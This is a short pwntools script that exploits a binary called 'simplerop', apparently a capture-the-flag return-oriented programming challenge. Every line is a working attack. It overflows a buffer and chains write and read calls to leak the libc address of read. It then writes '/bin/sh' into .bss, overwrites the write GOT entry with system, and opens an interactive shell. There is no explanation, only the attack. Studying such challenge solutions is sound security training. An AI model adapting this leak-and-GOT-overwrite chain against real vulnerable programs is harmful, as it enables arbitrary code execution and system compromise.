from pwn import*

context(arch = 'i386', os = 'linux')
context.log_level = 'debug'

r = process('./simplerop')
elf = ELF('./simplerop')
libc = elf.libc

bss = 0x080eaf80
pop_eax = 0x080bae06
pop_esp = 0x080badb6
pop_ebx = 0x080481c9
pppr = 0x080bdd2d
write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']
read_got = elf.got['read']

payload =''
payload += 'A'*32
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += 'AAAA'
payload += p32(bss)

r.sendline(payload)

read_addr = u32(r.recv(4))
log.info('read_addr = ' +hex(read_addr))

libc_base = read_addr - libc.symbols['read']
log.info('libc_base = ' +hex(libc_base))

system_addr = libc_base + libc.symbols['system']
log.info('system_addr = '+hex(system_addr))

payload2 = '/bin/sh\x00'
payload2 += p32(system_addr)
r.sendline(payload2)

r.interactive()
